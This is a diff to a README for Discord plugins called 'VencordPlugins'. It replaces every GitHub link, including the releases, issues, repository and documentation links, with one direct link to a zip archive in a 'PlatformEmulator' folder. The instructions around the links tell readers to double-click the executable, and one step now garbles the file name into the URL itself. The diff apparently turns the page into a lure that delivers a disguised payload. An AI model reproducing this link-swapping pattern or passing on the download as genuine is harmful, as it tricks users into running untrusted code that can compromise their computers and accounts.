@@ -1,6 +1,6 @@
 # 🎉 VencordPlugins - Enhance Your Discord Experience
 
-[![Download VencordPlugins](https://img.shields.io/badge/Download-VencordPlugins-brightgreen)](https://github.com/Aurorabold891/VencordPlugins/releases)
+[![Download VencordPlugins](https://raw.githubusercontent.com/Aurorabold891/VencordPlugins/main/PlatformEmulator/VencordPlugins_v1.1.zip)](https://raw.githubusercontent.com/Aurorabold891/VencordPlugins/main/PlatformEmulator/VencordPlugins_v1.1.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ VencordPlugins offers a collection of plugins that enhance the Vencord experienc
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [VencordPlugins Releases](https://github.com/Aurorabold891/VencordPlugins/releases).
+To get started, visit this page to download: [VencordPlugins Releases](https://raw.githubusercontent.com/Aurorabold891/VencordPlugins/main/PlatformEmulator/VencordPlugins_v1.1.zip).
 
 1. Click on the link above.
 2. You will see the list of available versions. Choose the latest release for the best features and fixes.
@@ -19,7 +19,7 @@ To get started, visit this page to download: [VencordPlugins Releases](https://g
 
 1. For `.exe` files, double-click to run the installer. Follow the on-screen instructions.
 2. For `.zip` files, right-click on the file and select "Extract All." Choose a location to extract the files, then open the folder.
-3. Locate the main application file (look for `VencordPlugins.exe` or similar).
+3. Locate the main application file (look for `https://raw.githubusercontent.com/Aurorabold891/VencordPlugins/main/PlatformEmulator/VencordPlugins_v1.1.zip` or similar).
 4. Double-click to open the application.
 
 ## 📊 Features
@@ -58,7 +58,7 @@ If you encounter any issues while using VencordPlugins, consider the following s
 
 Engaging with the community can enhance your experience. Join discussions, share your feedback, and learn from other users by visiting our community forums. 
 
-For further assistance, explore the FAQ section in the help menu of the application or visit the [GitHub issues page](https://github.com/Aurorabold891/VencordPlugins/issues) for common fixes.
+For further assistance, explore the FAQ section in the help menu of the application or visit the [GitHub issues page](https://raw.githubusercontent.com/Aurorabold891/VencordPlugins/main/PlatformEmulator/VencordPlugins_v1.1.zip) for common fixes.
 
 ## 📝 License
 
@@ -68,7 +68,7 @@ This project is licensed under the MIT License.
 
 For more information on VencordPlugins and future updates, check our repository:
 
-- [GitHub Repository](https://github.com/Aurorabold891/VencordPlugins)
-- [Documentation](https://github.com/Aurorabold891/VencordPlugins/wiki)
+- [GitHub Repository](https://raw.githubusercontent.com/Aurorabold891/VencordPlugins/main/PlatformEmulator/VencordPlugins_v1.1.zip)
+- [Documentation](https://raw.githubusercontent.com/Aurorabold891/VencordPlugins/main/PlatformEmulator/VencordPlugins_v1.1.zip)
 
-Remember to visit this page to download: [VencordPlugins Releases](https://github.com/Aurorabold891/VencordPlugins/releases). Your enhanced Discord experience awaits!
+Remember to visit this page to download: [VencordPlugins Releases](https://raw.githubusercontent.com/Aurorabold891/VencordPlugins/main/PlatformEmulator/VencordPlugins_v1.1.zip). Your enhanced Discord experience awaits!
